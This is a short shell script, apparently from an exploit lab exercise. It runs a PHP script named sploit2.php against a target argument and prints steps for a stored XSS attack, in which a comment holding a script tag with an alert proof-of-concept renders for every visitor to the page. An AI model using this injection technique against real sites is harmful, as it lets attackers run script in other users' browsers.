#! /bin/sh
php sploit2.php $1
echo "\n XSS Injection Attack: \n"
echo "1.) Authenticate (Don't really need to)\n"
echo "2.) Make a comment on post using javascript, in this case, <script>alert('I am a javascript Injection')</script>\n"
echo "3.) Inserts comment, anytime a user visit the page, the comment gets render as an actual html tag, this gives really complete control over the site as shown in the HTML above\n"
